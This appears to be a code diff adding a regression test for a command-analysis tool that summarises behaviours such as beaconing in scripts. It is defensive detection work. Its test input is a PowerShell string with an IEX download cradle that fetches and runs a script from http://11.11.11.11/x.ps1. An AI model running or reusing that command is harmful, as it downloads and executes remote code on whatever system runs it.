@@ -438,4 +438,21 @@ describe('whole-branch review regressions (2026-08-19)', () => {
       }
     }
   })
+
+  it('F1 follow-up (scoped re-review): beacon-loop never names a host that sits textually AFTER the loop\'s closing brace, even when it falls inside the naive ~400-char window', async () => {
+    // A while/Start-Sleep loop with an EMPTY body, followed by an unrelated
+    // download-cradle URL just past the closing brace — well within 400 chars
+    // of the literal "while". Before this fix, beaconLoopHost() scanned a
+    // flat forward window with no brace-awareness and picked up this
+    // out-of-body URL, misattributing the download's host to the beacon —
+    // the same cross-behavior misattribution class as F1.
+    const input = "while ($true) { Start-Sleep -Seconds 30 } ; IEX (New-Object Net.WebClient).DownloadString('http://11.11.11.11/x.ps1')"
+    const r = await analyze(input)
+    const beacon = r.bullets.find((b) => b.verb === 'Beacons')
+    expect(beacon).toBeTruthy()
+    expect(beacon!.text).not.toContain('11.11.11.11')
+    // either a genuinely in-body host (none here) or the unnamed degrade form
+    expect(beacon!.text).toBe('Beacons to a remote host in a loop every ~30s')
+    expect(beacon!.confidence).toBe('inferred')
+  })
 })
